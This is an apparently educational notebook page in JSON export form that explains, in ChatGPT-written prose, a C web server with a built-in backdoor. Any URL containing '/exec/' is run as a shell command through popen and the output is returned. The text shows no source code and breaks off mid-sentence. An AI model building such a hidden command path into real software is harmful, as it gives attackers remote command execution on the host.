{"version":3,"kind":"Notebook","sha256":"f95578b52d09f3ad98815a65d04a2ce0b6ede2552609608d46bd41e257130bce","slug":"sections.computer-programming.c.backdoored-webserver.backdoored-webserver","location":"/Sections/Computer_Programming/C/Backdoored_Webserver/backdoored_webserver.ipynb","dependencies":[],"frontmatter":{"title":"Backdoored Webserver","content_includes_title":false,"kernelspec":{"name":"py311_env","display_name":"Python 3.11","language":"python"},"authors":[{"nameParsed":{"literal":"Mark Khusid","given":"Mark","family":"Khusid"},"name":"Mark Khusid","id":"contributors-myst-generated-uid-0"}],"github":"https://github.com/markkhusid/MKDynamics_Website_V2","numbering":{"title":{"offset":3}},"source_url":"https://github.com/markkhusid/MKDynamics_Website_V2/blob/master/Sections/Computer_Programming/C/Backdoored_Webserver/backdoored_webserver.ipynb","edit_url":"https://github.com/markkhusid/MKDynamics_Website_V2/edit/master/Sections/Computer_Programming/C/Backdoored_Webserver/backdoored_webserver.ipynb","thumbnail":"/backdoored_webserver-aef62794930d8b394e688e73b8e2a087.png","exports":[{"format":"ipynb","filename":"backdoored_webserver.ipynb","url":"/backdoored_webserver-14429eb607441f82c2d0bd054748c93b.ipynb"}]},"widgets":{},"mdast":{"type":"root","children":[{"type":"block","kind":"notebook-content","children":[{"type":"image","url":"/backdoored_webserver-aef62794930d8b394e688e73b8e2a087.png","alt":"backdoored_webserver","width":"400px","align":"center","key":"urYe6Je9p7","urlSource":"images/backdoored_webserver.png"}],"key":"WXgXZm7EyD"},{"type":"block","kind":"notebook-content","data":{"vscode":{"languageId":"plaintext"}},"children":[{"type":"heading","depth":2,"position":{"start":{"line":1,"column":1},"end":{"line":1,"column":1}},"children":[{"type":"text","value":"Introduction","position":{"start":{"line":1,"column":1},"end":{"line":1,"column":1}},"key":"jAIl8QukZE"}],"identifier":"introduction","label":"Introduction","html_id":"introduction","implicit":true,"key":"kVdcBpXXqd"}],"key":"hqRP7hOJFl"},{"type":"block","kind":"notebook-content","children":[{"type":"paragraph","position":{"start":{"line":1,"column":1},"end":{"line":1,"column":1}},"children":[{"type":"text","value":"In this section, we will discuss the implementation of a backdoored web server in C. The backdoored web server is a simple web server that listens on a specified port and serves files from a specified directory. The backdoor functionality allows an attacker to execute arbitrary commands on the server by sending specially crafted HTTP requests.","position":{"start":{"line":1,"column":1},"end":{"line":1,"column":1}},"key":"b0HHyUhSDb"}],"key":"AwwJ1hx5AQ"}],"key":"hgcdPMK5w0"},{"type":"block","kind":"notebook-content","children":[{"type":"heading","depth":2,"position":{"start":{"line":1,"column":1},"end":{"line":1,"column":1}},"children":[{"type":"text","value":"Explanation of Code by ChatGPT 4o (OpenAI)","position":{"start":{"line":1,"column":1},"end":{"line":1,"column":1}},"key":"OnYFVfq65p"}],"identifier":"explanation-of-code-by-chatgpt-4o-openai","label":"Explanation of Code by ChatGPT 4o (OpenAI)","html_id":"explanation-of-code-by-chatgpt-4o-openai","implicit":true,"key":"gqraRRHybA"}],"key":"JNjSUirWtA"},{"type":"block","kind":"notebook-content","children":[{"type":"paragraph","position":{"start":{"line":1,"column":1},"end":{"line":1,"column":1}},"children":[{"type":"text","value":"The provided C code implements a basic HTTP server with a backdoor functionality that listens for incoming HTTP requests, processes them, and executes commands embedded in the URL of the request if specific conditions are met. Here’s a detailed explanation of the code:","position":{"start":{"line":1,"column":1},"end":{"line":1,"column":1}},"key":"RyTCX2CWUy"}],"key":"V8yRX8PxbS"},{"type":"thematicBreak","position":{"start":{"line":3,"column":1},"end":{"line":3,"column":1}},"key":"wyMaTzmorL"},{"type":"heading","depth":3,"position":{"start":{"line":5,"column":1},"end":{"line":5,"column":1}},"children":[{"type":"strong","position":{"start":{"line":5,"column":1},"end":{"line":5,"column":1}},"children":[{"type":"text","value":"Key Functionalities","position":{"start":{"line":5,"column":1},"end":{"line":5,"column":1}},"key":"TnQsKym5JE"}],"key":"SwL7RN2HxB"}],"identifier":"key-functionalities","label":"Key Functionalities","html_id":"key-functionalities","implicit":true,"key":"Xy1a4R2D20"},{"type":"list","ordered":true,"start":1,"spread":false,"position":{"start":{"line":6,"column":1},"end":{"line":19,"column":1}},"children":[{"type":"listItem","spread":true,"position":{"start":{"line":6,"column":1},"end":{"line":9,"column":1}},"children":[{"type":"paragraph","position":{"start":{"line":6,"column":1},"end":{"line":6,"column":1}},"children":[{"type":"strong","position":{"start":{"line":6,"column":1},"end":{"line":6,"column":1}},"children":[{"type":"text","value":"Socket Communication:","position":{"start":{"line":6,"column":1},"end":{"line":6,"column":1}},"key":"zyOytCM2kb"}],"key":"zqsZ1SzKsi"}],"key":"yGTMkPMQ5i"},{"type":"list","ordered":false,"spread":false,"position":{"start":{"line":7,"column":1},"end":{"line":9,"column":1}},"children":[{"type":"listItem","spread":true,"position":{"start":{"line":7,"column":1},"end":{"line":7,"column":1}},"children":[{"type":"paragraph","children":[{"type":"text","value":"The server listens on a specified port for incoming connections.","position":{"start":{"line":7,"column":1},"end":{"line":7,"column":1}},"key":"R11A8cRKCJ"}],"key":"K3MnAVa8TA"}],"key":"NeVpdfuxjA"},{"type":"listItem","spread":true,"position":{"start":{"line":8,"column":1},"end":{"line":9,"column":1}},"children":[{"type":"paragraph","children":[{"type":"text","value":"It processes HTTP requests from clients and sends appropriate responses.","position":{"start":{"line":8,"column":1},"end":{"line":8,"column":1}},"key":"wbPwm9aBm7"}],"key":"qfxii2P1gp"}],"key":"rOS6ryn0f4"}],"key":"dssitM4Zh7"}],"key":"r2Qv85nLCo"},{"type":"listItem","spread":true,"position":{"start":{"line":10,"column":1},"end":{"line":13,"column":1}},"children":[{"type":"paragraph","position":{"start":{"line":10,"column":1},"end":{"line":10,"column":1}},"children":[{"type":"strong","position":{"start":{"line":10,"column":1},"end":{"line":10,"column":1}},"children":[{"type":"text","value":"Backdoor Command Execution:","position":{"start":{"line":10,"column":1},"end":{"line":10,"column":1}},"key":"gXrQTSm2ba"}],"key":"wikuFaq2AY"}],"key":"IHozpVNgbg"},{"type":"list","ordered":false,"spread":false,"position":{"start":{"line":11,"column":1},"end":{"line":13,"column":1}},"children":[{"type":"listItem","spread":true,"position":{"start":{"line":11,"column":1},"end":{"line":11,"column":1}},"children":[{"type":"paragraph","children":[{"type":"text","value":"If the URL in the HTTP request contains ","position":{"start":{"line":11,"column":1},"end":{"line":11,"column":1}},"key":"EPCmxf6uya"},{"type":"inlineCode","value":"/exec/","position":{"start":{"line":11,"column":1},"end":{"line":11,"column":1}},"key":"gMbIxppuih"},{"type":"text","value":", the server interprets the string after ","position":{"start":{"line":11,"column":1},"end":{"line":11,"column":1}},"key":"yxK1BWAO2r"},{"type":"inlineCode","value":"/exec/","position":{"start":{"line":11,"column":1},"end":{"line":11,"column":1}},"key":"FpYLolAbMz"},{"type":"text","value":" as a system command.","position":{"start":{"line":11,"column":1},"end":{"line":11,"column":1}},"key":"tB0BuFq9OZ"}],"key":"WYzt5DHjiT"}],"key":"hERNMpmkT2"},{"type":"listItem","spread":true,"position":{"start":{"line":12,"column":1},"end":{"line":13,"column":1}},"children":[{"type":"paragraph","children":[{"type":"text","value":"This command is executed using ","position":{"start":{"line":12,"column":1},"end":{"line":12,"column":1}},"key":"v20HJrsktw"},{"type":"inlineCode","value":"popen","position":{"start":{"line":12,"column":1},"end":{"line":12,"column":1}},"key":"CDpIts4ebw"},{"type":"text","value":", and the output is sent back to the client.","position":{"start":{"line":12,"column":1},"end":{"line":12,"column":1}},"key":"HIwLNUGMcE"}],"key":"dO8kLHP15Q"}],"key":"yjppkSYb64"}],"key":"xRSXkMCG9v"}],"key":"OcDGIpjA0E"},{"type":"listItem","spread":true,"position":{"start":{"line":14,"column":1},"end":{"line":16,"column":1}},"children":[{"type":"paragraph","position":{"start":{"line":14,"column":1},"end":{"line":14,"column":1}},"children":[{"type":"strong","position":{"start":{"line":14,"column":1},"end":{"line":14,"column":1}},"children":[{"type":"text","value":"URL Decoding:","position":{"start":{"line":14,"column":1},"end":{"line":14,"column":1}},"key":"l3G1KYY5rT"}],"key":"HerFMA8ReT"}],"key":"HYrmyzSqND"},{"type":"list","ordered":false,"spread":false,"position":{"start":{"line":15,"column":1},"end":{"line":16,"column":1}},"children":[{"type":"listItem","spread":true,"position":{"start":{"line":15,"column":1},"end":{"line":16,"column":1}},"children":[{"type":"paragraph","children":[{"type":"text","value":"Encoded URLs are decoded to retrieve their original form.","position":{"start":{"line":15,"column":1},"end":{"line":15,"column":1}},"key":"rf1tNs9nkt"}],"key":"XaAhuECZcl"}],"key":"t7Gd6TnrpU"}],"key":"YVHvwMFJbi"}],"key":"T3FfmhIr6R"},{"type":"listItem","spread":true,"position":{"start":{"line":17,"column":1},"end":{"line":19,"column":1}},"children":[{"type":"paragraph","position":{"start":{"line":17,"column":1},"end":{"line":17,"column":1}},"children":[{"type":"strong","position":{"start":{"line":17,"column":1},"end":{"line":17,"column":1}},"children":[{"type":"text","value":"Response Handling:","position":{"start":{"line":17,"column":1},"end":{"line":17,"column":1}},"key":"hle0Drpei4"}],"key":"wt6lbl8hlW"}],"key":"KXsKNDTmDk"},{"type":"list","ordered":false,"spread":false,"position":{"start":{"line":18,"column":1},"end":{"line":19,"column":1}},"children":[{"type":"listItem","spread":true,"position":{"start":{"line":18,"column":1},"end":{"line":19,"column":1}},"children":[{"type":"paragraph","children":[{"type":"text","value":"The server can send different HTTP responses: 200 OK, 404 Not Found, or 400 Bad Request.","position":{"start":{"line":18,"column":1},"end":{"line":18,"column":1}},"key":"PAambM2Mem"}],"key":"MHX3dbWIYQ"}],"key":"eCu67tJhnd"}],"key":"uTqng1D9IR"}],"key":"JzqCR1KFa6"}],"key":"P55tmHeDHZ"},{"type":"thematicBreak","position":{"start":{"line":20,"column":1},"end":{"line":20,"column":1}},"key":"dBCav6My4L"},{"type":"heading","depth":3,"position":{"start":{"line":22,"column":1},"end":{"line":22,"column":1}},"children":[{"type":"strong","position":{"start":{"line":22,"column":1},"end":{"line":22,"column":1}},"children":[{"type":"text","value":"Main Components","position":{"start":{"line":22,"column":1},"end":{"line":22,"column":1}},"key":"VHoA8joDfD"}],"key":"udPV0YU1Iu"}],"identifier":"main-components","label":"Main Components","html_id":"main-components","implicit":true,"key":"Ua1Ne0w9vi"},{"type":"heading","depth":4,"position":{"start":{"line":23,"column":1},"end":{"line":23,"column":1}},"children":[{"type":"strong","position":{"start":{"line":23,"column":1},"end":{"line":23,"column":1}},"children":[{"type":"text","value":"Global Definitions","position":{"start":{"line":23,"column":1},"end":{"line":23,"column":1}},"key":"MMAkzm14Up"}],"key":"cXzNkpzleI"}],"identifier":"global-definitions","label":"Global Definitions","html_id":"global-definitions","implicit":true,"key":"L2kQVs01iU"},{"type":"list","ordered":false,"spread":false,"position":{"start":{"line":24,"column":1},"end":{"line":28,"column":1}},"children":[{"type":"listItem","spread":true,"position":{"start":{"line":24,"column":1},"end":{"line":25,"column":1}},"children":[{"type":"paragraph","children":[{"type":"strong","position":{"start":{"line":24,"column":1},"end":{"line":24,"column":1}},"children":[{"type":"text","value":"Buffer Sizes:","position":{"start":{"line":24,"column":1},"end":{"line":24,"column":1}},"key":"zawxHrKsi4"}],"key":"kE736tVuLx"},{"type":"text","value":"\n","position":{"start":{"line":24,"column":1},"end":{"line":24,"column":1}},"key":"fslWVrn48U"},{"type":"inlineCode","value":"BUFFER_SIZE","position":{"start":{"line":24,"column":1},"end":{"line":24,"column":1}},"key":"bJgSu36BgF"},{"type":"text","value":" and other constants are used to define limits for reading data and constructing responses.","position":{"start":{"line":24,"column":1},"end":{"line":24,"column":1}},"key":"HOvYg6BMBD"}],"key":"ozK0SrjTbt"}],"key":"WCPbe1kueR"},{"type":"listItem","spread":true,"position":{"start":{"line":26,"column":1},"end":{"line":28,"column":1}},"children":[{"type":"paragraph","children":[{"type":"strong","position":{"start":{"line":26,"column":1},"end":{"line":26,"column":1}},"children":[{"type":"text","value":"Predefined Responses:","position":{"start":{"line":26,"column":1},"end":{"line":26,"column":1}},"key":"mZTTMgYLxR"}],"key":"C671a7OHTo"},{"type":"text","value":"\nStrings for various HTTP response codes (","position":{"start":{"line":26,"column":1},"end":{"line":26,"column":1}},"key":"DBZHELQbb5"},{"type":"inlineCode","value":"200 OK","position":{"start":{"line":26,"column":1},"end":{"line":26,"column":1}},"key":"Cq5tOjwgNQ"},{"type":"text","value":", ","position":{"start":{"line":26,"column":1},"end":{"line":26,"column":1}},"key":"tVsMMDige3"},{"type":"inlineCode","value":"404 Not Found","position":{"start":{"line":26,"column":1},"end":{"line":26,"column":1}},"key":"RLAPwaRbne"},{"type":"text","value":", etc.) are constructed.","position":{"start":{"line":26,"column":1},"end":{"line":26,"column":1}},"key":"RqoTWwX7S9"}],"key":"CAWQ240wKI"}],"key":"gkx0eGdTzJ"}],"key":"uLX2oUTYJR"},{"type":"heading","depth":4,"position":{"start":{"line":29,"column":1},"end":{"line":29,"column":1}},"children":[{"type":"strong","position":{"start":{"line":29,"column":1},"end":{"line":29,"column":1}},"children":[{"type":"text","value":"Main Function","position":{"start":{"line":29,"column":1},"end":{"line":29,"column":1}},"key":"nBUTDYM8Mt"}],"key":"ilVGoAAR04"}],"identifier":"main-function","label":"Main Function","html_id":"main-function","implicit":true,"key":"Xlf3srqE51"},{"type":"list","ordered":true,"start":1,"spread":false,"position":{"start":{"line":30,"column":1},"end":{"line":53,"column":1}},"children":[{"type":"listItem","spread":true,"position":{"start":{"line":30,"column":1},"end":{"line":33,"column":1}},"children":[{"type":"paragraph","position":{"start":{"line":30,"column":1},"end":{"line":30,"column":1}},"children":[{"type":"strong","position":{"start":{"line":30,"column":1},"end":{"line":30,"column":1}},"children":[{"type":"text","value":"Socket Setup:","position":{"start":{"line":30,"column":1},"end":{"line":30,"column":1}},"key":"UXyrCg8T8o"}],"key":"OfEfrNSbMq"}],"key":"t8OGMINZKq"},{"type":"list","ordered":false,"spread":false,"position":{"start":{"line":31,"column":1},"end":{"line":33,"column":1}},"children":[{"type":"listItem","spread":true,"position":{"start":{"line":31,"column":1},"end":{"line":31,"column":1}},"children":[{"type":"paragraph","children":[{"type":"text","value":"A socket is created and configured to listen on the specified port (","position":{"start":{"line":31,"column":1},"end":{"line":31,"column":1}},"key":"EjioW1ekMx"},{"type":"inlineCode","value":"socket","position":{"start":{"line":31,"column":1},"end":{"line":31,"column":1}},"key":"SEYmvwbIsR"},{"type":"text","value":" and ","position":{"start":{"line":31,"column":1},"end":{"line":31,"column":1}},"key":"sYmak6asNS"},{"type":"inlineCode","value":"bind","position":{"start":{"line":31,"column":1},"end":{"line":31,"column":1}},"key":"wNxkYroF0Y"},{"type":"text","value":" calls).","position":{"start":{"line":31,"column":1},"end":{"line":31,"column":1}},"key":"oN3HTL5IEH"}],"key":"svT1biAhrl"}],"key":"iCcotn93A1"},{"type":"listItem","spread":true,"position":{"start":{"line":32,"column":1},"end":{"line":33,"column":1}},"children":[{"type":"paragraph","children":[{"type":"text","value":"The ","position":{"start":{"line":32,"column":1},"end":{"line":32,"column":1}},"key":"VRpTxz5Gs4"},{"type":"inlineCode","value":"setsockopt","position":{"start":{"line":32,"column":1},"end":{"line":32,"column":1}},"key":"UDhPNzRYUv"},{"type":"text","value":" function allows reusing the socket address.","position":{"start":{"line":32,"column":1},"end":{"line":32,"column":1}},"key":"fDAWA5aI2a"}],"key":"YW7MHPQH8w"}],"key":"kyHqQQO8yW"}],"key":"S7dnQ9PszJ"}],"key":"N8fYq1Zkgd"},{"type":"listItem","spread":true,"position":{"start":{"line":34,"column":1},"end":{"line":37,"column":1}},"children":[{"type":"paragraph","position":{"start":{"line":34,"column":1},"end":{"line":34,"column":1}},"children":[{"type":"strong","position":{"start":{"line":34,"column":1},"end":{"line":34,"column":1}},"children":[{"type":"text","value":"Listening for Connections:","position":{"start":{"line":34,"column":1},"end":{"line":34,"column":1}},"key":"S5WvD4msdG"}],"key":"GtowvBbozZ"}],"key":"VM7W9TN1a6"},{"type":"list","ordered":false,"spread":false,"position":{"start":{"line":35,"column":1},"end":{"line":37,"column":1}},"children":[{"type":"listItem","spread":true,"position":{"start":{"line":35,"column":1},"end":{"line":35,"column":1}},"children":[{"type":"paragraph","children":[{"type":"text","value":"The ","position":{"start":{"line":35,"column":1},"end":{"line":35,"column":1}},"key":"aIWOyikCdS"},{"type":"inlineCode","value":"listen","position":{"start":{"line":35,"column":1},"end":{"line":35,"column":1}},"key":"pudAIT4JV6"},{"type":"text","value":" function queues incoming connections.","position":{"start":{"line":35,"column":1},"end":{"line":35,"column":1}},"key":"J0FMYaE1t8"}],"key":"gYTxhcZcTf"}],"key":"WkdyDNKdMU"},{"type":"listItem","spread":true,"position":{"start":{"line":36,"column":1},"end":{"line":37,"column":1}},"children":[{"type":"paragraph","children":[{"type":"text","value":"The server accepts connections with ","position":{"start":{"line":36,"column":1},"end":{"line":36,"column":1}},"key":"fYkoW2PWea"},{"type":"inlineCode","value":"accept","position":{"start":{"line":36,"column":1},"end":{"line":36,"column":1}},"key":"zBk87BTWMF"},{"type":"text","value":" and processes each request in a loop.","position":{"start":{"line":36,"column":1},"end":{"line":36,"column":1}},"key":"QvZirigEc1"}],"key":"PxyCMPpv0B"}],"key":"ScYCjXKp3s"}],"key":"fztns2E3J9"}],"key":"w7Ays6mrq9"},{"type":"listItem","spread":true,"position":{"start":{"line":38,"column":1},"end":{"line":50,"column":1}},"children":[{"type":"paragraph","position":{"start":{"line":38,"column":1},"end":{"line":38,"column":1}},"children":[{"type":"strong","position":{"start":{"line":38,"column":1},"end":{"line":38,"column":1}},"children":[{"type":"text","value":"Processing Requests:","position":{"start":{"line":38,"column":1},"end":{"line":38,"column":1}},"key":"aocU4glgsU"}],"key":"nIwao6Ii6N"}],"key":"D5GUXx3A8U"},{"type":"list","ordered":false,"spread":false,"position":{"start":{"line":39,"column":1},"end":{"line":50,"column":1}},"children":[{"type":"listItem","spread":true,"position":{"start":{"line":39,"column":1},"end":{"line":40,"column":1}},"children":[{"type":"paragraph","children":[{"type":"strong","position":{"start":{"line":39,"column":1},"end":{"line":39,"column":1}},"children":[{"type":"text","value":"Receiving Data:","position":{"start":{"line":39,"column":1},"end":{"line":39,"column":1}},"key":"sZMsUvby2y"}],"key":"Y9DkdKSLzl"},{"type":"text","value":"\nIncoming HTTP requests are read into a buffer using ","position":{"start":{"line":39,"column":1},"end":{"line":39,"column":1}},"key":"IstQiCZRVv"},{"type":"inlineCode","value":"recv","position":{"start":{"line":39,"column":1},"end":{"line":39,"column":1}},"key":"yfhBatVPMp"},{"type":"text","value":".","position":{"start":{"line":39,"column":1},"end":{"line":39,"column":1}},"key":"aHy8eU6uLQ"}],"key":"T4w7qSUSGg"}],"key":"vx8Yyks3zl"},{"type":"listItem","spread":true,"position":{"start":{"line":41,"column":1},"end":{"line":42,"column":1}},"children":[{"type":"paragraph","children":[{"type":"strong","position":{"start":{"line":41,"column":1},"end":{"line":41,"column":1}},"children":[{"type":"text","value":"URL Parsing:","position":{"start":{"line":41,"column":1},"end":{"line":41,"column":1}},"key":"MOdKEkvN2b"}],"key":"mx6wOAnM0j"},{"type":"text","value":"\nThe ","position":{"start":{"line":41,"column":1},"end":{"line":41,"column":1}},"key":"QtvurcEtUA"},{"type":"inlineCode","value":"get_URL_from_header","position":{"start":{"line":41,"column":1},"end":{"line":41,"column":1}},"key":"ZeQl8XoX9u"},{"type":"text","value":" function extracts the URL from the HTTP request header.","position":{"start":{"line":41,"column":1},"end":{"line":41,"column":1}},"key":"XDB0m1ZQNw"}],"key":"PUGISApw8J"}],"key":"WceyPGnCUG"},{"type":"listItem","spread":true,"position":{"start":{"line":43,"column":1},"end":{"line":44,"column":1}},"children":[{"type":"paragraph","children":[{"type":"strong","position":{"start":{"line":43,"column":1},"end":{"line":43,"column":1}},"children":[{"type":"text","value":"URL Decoding:","position":{"start":{"line":43,"column":1},"end":{"line":43,"column":1}},"key":"Jwn7eja7dN"}],"key":"r1fFA99RTp"},{"type":"text","value":"\nThe extracted URL is decoded using ","position":{"start":{"line":43,"column":1},"end":{"line":43,"column":1}},"key":"sooSOj7exZ"},{"type":"inlineCode","value":"URL_decode","position":{"start":{"line":43,"column":1},"end":{"line":43,"column":1}},"key":"XB947CKuqZ"},{"type":"text","value":".","position":{"start":{"line":43,"column":1},"end":{"line":43,"column":1}},"key":"x2vV7tPrY5"}],"key":"ZlsDU0GUUi"}],"key":"XUA9TaoMPV"},{"type":"listItem","spread":true,"position":{"start":{"line":45,"column":1},"end":{"line":47,"column":1}},"children":[{"type":"paragraph","children":[{"type":"strong","position":{"start":{"line":45,"column":1},"end":{"line":45,"column":1}},"children":[{"type":"text","value":"Command Handling:","position":{"start":{"line":45,"column":1},"end":{"line":45,"column":1}},"key":"YfsW4Dn9ut"}],"key":"yRH8bblCgb"}],"key":"UxOQOYr20v"},{"type":"list","ordered":false,"spread":false,"position":{"start":{"line":46,"column":1},"end":{"line":47,"column":1}},"children":[{"type":"listItem","spread":true,"position":{"start":{"line":46,"column":1},"end":{"line":46,"column":1}},"children":[{"type":"paragraph","children":[{"type":"text","value":"If the URL contains ","position":{"start":{"line":46,"column":1},"end":{"line":46,"column":1}},"key":"dEVKCffi0Y"},{"type":"inlineCode","value":"/exec/","position":{"start":{"line":46,"column":1},"end":{"line":46,"column":1}},"key":"FufK9fhP5w"},{"type":"text","value":", the part after it is treated as a shell command.","position":{"start":{"line":46,"column":1},"end":{"line":46,"column":1}},"key":"Zp9xHcnqqn"}],"key":"pQhnbNGxfW"}],"key":"yxoTjGhf4X"},{"type":"listItem","spread":true,"position":{"start":{"line":47,"column":1},"end":{"line":47,"column":1}},"children":[{"type":"paragraph","children":[{"type":"text","value":"The command is executed, and its output is sent to the client as part of the HTTP response.","position":{"start":{"line":47,"column":1},"end":{"line":47,"column":1}},"key":"YfO52ngYMu"}],"key":"anL2WrfL9S"}],"key":"p6tmkGPNBj"}],"key":"DjsgapMQT4"}],"key":"Oana5lKBv0"},{"type":"listItem","spread":true,"position":{"start":{"line":48,"column":1},"end":{"line":50,"column":1}},"children":[{"type":"paragraph","children":[{"type":"strong","position":{"start":{"line":48,"column":1},"end":{"line":48,"column":1}},"children":[{"type":"text","value":"Invalid Requests:","position":{"start":{"line":48,"column":1},"end":{"line":48,"column":1}},"key":"zFoQ7CMtMj"}],"key":"hf80t1BLOD"},{"type":"text","value":"\nRequests without ","position":{"start":{"line":48,"column":1},"end":{"line":48,"column":1}},"key":"tgcofubChl"},{"type":"inlineCode","value":"/exec/","position":{"start":{"line":48,"column":1},"end":{"line":48,"column":1}},"key":"pSgLFZW9WE"},{"type":"text","value":" or malformed URLs receive appropriate error responses (","position":{"start":{"line":48,"column":1},"end":{"line":48,"column":1}},"key":"Ecebohu6QI"},{"type":"inlineCode","value":"404","position":{"start":{"line":48,"column":1},"end":{"line":48,"column":1}},"key":"CQ34yAW8Im"},{"type":"text","value":" or ","position":{"start":{"line":48,"column":1},"end":{"line":48,"column":1}},"key":"dHQII12cxP"},{"type":"inlineCode","value":"400","position":{"start":{"line":48,"column":1},"end":{"line":48,"column":1}},"key":"hgFb7BW3CM"},{"type":"text","value":").","position":{"start":{"line":48,"column":1},"end":{"line":48,"column":1}},"key":"hfuFGNn82T"}],"key":"OyATI0jBly"}],"key":"GnCOFcmVDa"}],"key":"MjfEXUOpEi"}],"key":"pweh7hjpes"},{"type":"listItem","spread":true,"position":{"start":{"line":51,"column":1},"end":{"line":53,"column":1}},"children":[{"type":"paragraph","position":{"start":{"line":51,"column":1},"end":{"line":51,"column":1}},"children":[{"type":"strong","position":{"start":{"line":51,"column":1},"end":{"line":51,"column":1}},"children":[{"type":"text","value":"Response Sending:","position":{"start":{"line":51,"column":1},"end":{"line":51,"column":1}},"key":"rWtEvVzXfY"}],"key":"dlFxamBSmy"}],"key":"eaB9q2MXMS"},{"type":"list","ordered":false,"spread":false,"position":{"start":{"line":52,"column":1},"end":{"line":53,"column":1}},"children":[{"type":"listItem","spread":true,"position":{"start":{"line":52,"column":1},"end":{"line":53,"column":1}},"children":[{"type":"paragraph","children":[{"type":"inlineCode","value":"send_response","position":{"start":{"line":52,"column":1},"end":{"line":52,"column":1}},"key":"RLdEswdicx"},{"type":"text","value":" sends the constructed response back to the client.","position":{"start":{"line":52,"column":1},"end":{"line":52,"column":1}},"key":"os3hgoQFPb"}],"key":"QAOfDPez2k"}],"key":"o0piQCaLyd"}],"key":"iASIfFfEKe"}],"key":"zqOohLGiCK"}],"key":"ShRmByRDdm"},{"type":"heading","depth":4,"position":{"start":{"line":54,"column":1},"end":{"line":54,"column":1}},"children":[{"type":"strong","position":{"start":{"line":54,"column":1},"end":{"line":54,"column":1}},"children":[{"type":"text","value":"Helper Functions","position":{"start":{"line":54,"column":1},"end":{"line":54,"column":1}},"key":"MugYwtN4C1"}],"key":"hrYnDrpVG2"}],"identifier":"helper-functions","label":"Helper Functions","html_id":"helper-functions","implicit":true,"key":"pXkvffHxoR"},{"type":"list","ordered":true,"start":1,"spread":false,"position":{"start":{"line":55,"column":1},"end":{"line":72,"column":1}},"children":[{"type":"listItem","spread":true,"position":{"start":{"line":55,"column":1},"end":{"line":57,"column":1}},"children":[{"type":"paragraph","position":{"start":{"line":55,"column":1},"end":{"line":56,"column":1}},"children":[{"type":"strong","position":{"start":{"line":55,"column":1},"end":{"line":55,"column":1}},"children":[{"type":"inlineCode","value":"send_response","position":{"start":{"line":55,"column":1},"end":{"line":55,"column":1}},"key":"bNVYMT1R81"},{"type":"text","value":":","position":{"start":{"line":55,"column":1},"end":{"line":55,"column":1}},"key":"u34F6wnAR5"}],"key":"iwUhilIMjI"},{"type":"text","value":"\nSends an HTTP response back to the client socket, handling both successful and error cases.","position":{"start":{"line":55,"column":1},"end":{"line":55,"column":1}},"key":"oIiilo5mRr"}],"key":"TezSJjKDLs"}],"key":"nzcyU7j01v"},{"type":"listItem","spread":true,"position":{"start":{"line":58,"column":1},"end":{"line":60,"column":1}},"children":[{"type":"paragraph","position":{"start":{"line":58,"column":1},"end":{"line":59,"column":1}},"children":[{"type":"strong","position":{"start":{"line":58,"column":1},"end":{"line":58,"column":1}},"children":[{"type":"inlineCode","value":"get_URL_from_header","position":{"start":{"line":58,"column":1},"end":{"line":58,"column":1}},"key":"tREeH5UIZM"},{"type":"text","value":":","position":{"start":{"line":58,"column":1},"end":{"line":58,"column":1}},"key":"pmz9UljywF"}],"key":"lK0zxFdBp3"},{"type":"text","value":"\nExtracts the URL from the first line of the HTTP request header.","position":{"start":{"line":58,"column":1},"end":{"line":58,"column":1}},"key":"ux2GJGEMid"}],"key":"Ed2PtbeUQd"}],"key":"YMGkvt1yQx"},{"type":"listItem","spread":true,"position":{"start":{"line":61,"column":1},"end":{"line":63,"column":1}},"children":[{"type":"paragraph","position":{"start":{"line":61,"column":1},"end":{"line":62,"column":1}},"children":[{"type":"strong","position":{"start":{"line":61,"column":1},"end":{"line":61,"column":1}},"children":[{"type":"inlineCode","value":"URL_decode","position":{"start":{"line":61,"column":1},"end":{"line":61,"column":1}},"key":"k5rSIC3lEg"},{"type":"text","value":":","position":{"start":{"line":61,"column":1},"end":{"line":61,"column":1}},"key":"BaMflbjlVI"}],"key":"bkuaITPJ5u"},{"type":"text","value":"\nDecodes percent-encoded characters in URLs (e.g., ","position":{"start":{"line":61,"column":1},"end":{"line":61,"column":1}},"key":"W0qBVlXuJp"},{"type":"inlineCode","value":"%20","position":{"start":{"line":61,"column":1},"end":{"line":61,"column":1}},"key":"QrenrUWUXU"},{"type":"text","value":" becomes a space).","position":{"start":{"line":61,"column":1},"end":{"line":61,"column":1}},"key":"jjLLhPFew9"}],"key":"qoINYzx7CV"}],"key":"RURUB7vhnB"},{"type":"listItem","spread":true,"position":{"start":{"line":64,"column":1},"end":{"line":66,"column":1}},"children":[{"type":"paragraph","position":{"start":{"line":64,"column":1},"end":{"line":65,"column":1}},"children":[{"type":"strong","position":{"start":{"line":64,"column":1},"end":{"line":64,"column":1}},"children":[{"type":"inlineCode","value":"does_URL_contain_slash_exec","position":{"start":{"line":64,"column":1},"end":{"line":64,"column":1}},"key":"vWfQUpZi78"},{"type":"text","value":":","position":{"start":{"line":64,"column":1},"end":{"line":64,"column":1}},"key":"tlIUDXS9LD"}],"key":"k1QQ4D1jwU"},{"type":"text","value":"\nChecks if the URL contains the ","position":{"start":{"line":64,"column":1},"end":{"line":64,"column":1}},"key":"FUJDMzjWek"},{"type":"inlineCode","value":"/exec/","position":{"start":{"line":64,"column":1},"end":{"line":64,"column":1}},"key":"iHPSkro3Ju"},{"type":"text","value":" substring.","position":{"start":{"line":64,"column":1},"end":{"line":64,"column":1}},"key":"cNAb5pp2Mk"}],"key":"zAeW4AG3KB"}],"key":"vquxCDAQM9"},{"type":"listItem","spread":true,"position":{"start":{"line":67,"column":1},"end":{"line":69,"column":1}},"children":[{"type":"paragraph","position":{"start":{"line":67,"column":1},"end":{"line":68,"column":1}},"children":[{"type":"strong","position":{"start":{"line":67,"column":1},"end":{"line":67,"column":1}},"children":[{"type":"inlineCode","value":"get_CMD_from_decoded_URL","position":{"start":{"line":67,"column":1},"end":{"line":67,"column":1}},"key":"ZdQpEkoJAc"},{"type":"text","value":":","position":{"start":{"line":67,"column":1},"end":{"line":67,"column":1}},"key":"x075K7tZph"}],"key":"yiRVy9sQ53"},{"type":"text","value":"\nExtracts the command from the decoded URL after 